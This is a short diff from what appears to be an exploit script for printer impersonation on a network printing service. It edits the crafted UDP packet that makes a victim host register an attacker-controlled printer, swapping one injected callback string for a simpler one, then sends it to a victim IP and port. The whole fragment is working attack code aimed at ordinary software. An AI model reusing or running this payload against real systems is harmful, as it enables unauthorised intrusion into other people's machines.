@@ -176,9 +176,9 @@ if IMPERSONATE_PRINTER:
     # then, these are parsed after `uri`:
     #   "location" "info" (optional spaces between)
     #     use `info` to create a diff printer b/c it affects name
-
-    callback_url = f"FF 10 {attacker_http_printer} \"your_mom\"\"barinfo\""
-    # simplest:   callback_url = f"0 0 {attacker_http_printer}"
+    #
+    # callback_url = f"FF 10 {attacker_http_printer} \"your_mom\"\"barinfo\""
+    callback_url = f"0 0 {attacker_http_printer}" # simplest:
 
     send_udp_packet(victim_ip, victim_port, callback_url)
     print("sent")
